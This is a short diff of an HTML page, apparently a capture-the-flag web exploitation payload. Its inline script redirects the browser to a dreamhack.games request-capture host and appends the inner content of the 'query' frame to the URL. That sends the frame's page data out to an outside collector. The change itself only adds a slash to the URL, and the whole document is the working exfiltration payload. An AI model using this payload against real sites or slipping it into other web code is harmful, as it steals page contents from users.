@@ -6,6 +6,6 @@
   </body>
   <script>
     
-    location = 'https://ufhnazq.request.dreamhack.games' + document.getElementById("query").contentWindow.document.innerHTML
+    location = 'https://ufhnazq.request.dreamhack.games/' + document.getElementById("query").contentWindow.document.innerHTML
   </script>
 </html>
